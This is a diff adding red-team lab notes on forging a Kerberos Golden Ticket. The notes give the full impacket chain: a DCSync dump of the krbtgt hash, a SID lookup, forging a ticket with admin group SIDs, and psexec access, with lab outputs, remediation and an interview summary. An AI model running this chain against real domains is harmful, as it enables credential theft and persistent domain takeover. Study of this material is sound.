@@ -1,0 +1,92 @@
+Objective:
+
+Forge a Kerberos TGT offline using the krbtgt account's NT hash,
+bypassing the entire AS exchange and achieving persistent, unchecked domain access.
+
+Why It Works:
+
+The KDC's entire trust model is based on one assumption: "if this TGT blob decrypts correctly using my krbtgt key,
+everything inside it is legitimate." There is no issued-ticket registry — Kerberos is stateless.
+An attacker who holds krbtgt's NT hash can encrypt an arbitrary TGT with that key,
+and the KDC will accept it as genuine because it decrypts correctly.
+
+Attack Chain
+
+Step 1 — Obtain krbtgt hash via DCSync
+bash
+
+impacket-secretsdump redteamlab.local/Administrator:'<password>' \
+  -dc-ip 192.168.56.101
+
+  Result:krbtgt:502:
+  aad3b435b51404eeaad3b435b51404ee:dc48810c03b2c638c0cf41bc57c0d120
+
+  step 2 - obtain Domain SID 
+   bash
+    
+     impacket-lookupsid redteamlab.local/Administrator:'<password>' \
+     @192.168.56.101
+
+  Result:S-1-5-21-4152727142-2927276756-3439155973
+
+Step 3 — Forge the Golden Ticket
+bash
+impacket-ticketer \
+  -domain-sid S-1-5-21-4152727142-2927276756-3439155973 \
+  -nthash dc48810c03b2c638c0cf41bc57c0d120 \
+  -domain redteamlab.local \
+  -user-id 500 \
+  -extra-sid S-1-5-21-4152727142-2927276756-3439155973-512,\
+S-1-5-21-4152727142-2927276756-3439155973-519 \
+  Administrator
+
+output:[*] Saving ticket in Administrator .ccache
+
+Step 5 - Use ticket(hostname,not IP -Kerberos requires SPN match)
+bash 
+impacket-psexec -k -no-pass \
+  redteamlab.local/Administrator@WIN-56JEHJD0RI3.redteamlab.local
+
+Ticket Components Required
+
+Field       	          Value	                                                            Source
+____________________________________________________________________________________________________________
+Domain SID	           S-1-5-21-4152727142-...	                                          lookupsid
+____________________________________________________________________________________________________________
+krbtgt NT hash	       dc48810c03b2c638c0cf41bc57c0d120	                                  secretsdump
+____________________________________________________________________________________________________________
+Target username	       Administrator	                                                    known
+____________________________________________________________________________________________________________
+Target RID	           500	                                                              lookupsid output
+____________________________________________________________________________________________________________
+Group SIDs	           512 (Domain Admins), 519 (Enterprise Admins)	                      lookupsid output
+____________________________________________________________________________________________________________
+Lifetime	             Default 10 years (lab only — real ops use short lifetimes)	        ticketer default
+____________________________________________________________________________________________________________
+
+Packet-Level Verification
+ Captured Wireshark trace confirmed:
+
+  . No AS-REQ/AS-REP — the AS exchange was bypassed entirely (ticket forged offline)
+  . TGS-REQ/TGS-REP present — DC accepted the forged TGT and issued a real CIFS service ticket
+  . Service: cifs/WIN-56JEHJD0RI3.redteamlab.local
+  . A clean TGS-REP (no KRB-ERROR) proves the DC cryptographically validated the forged TGT
+
+Critical Lesson: IP vs Hostname
+Targeting by IP forces NTLM fallback regardless of ticket cache —
+ always use FQDN hostname matching the SPN for Kerberos tools.
+
+Remediation:
+ . Rotate krbtgt password twice with a gap between rotations (AD retains previous key temporarily for
+   in-flight ticket grace)
+ . A single rotation leaves the prior key valid during the grace period
+
+Interview Explanation:
+"A Golden Ticket is a forged Kerberos TGT signed with the domain's krbtgt key.
+Because Kerberos trust is stateless — the KDC trusts any TGT that decrypts correctly with its own key,
+without checking whether it ever issued it — an attacker who steals krbtgt's hash can forge tickets for any
+identity with any group membership. I obtained the hash via DCSync, forged the ticket using impacket-ticketer,
+and verified acceptance at the packet level by confirming a clean TGS-REP with no AS-REQ/AS-REP exchange."
+
+  
+
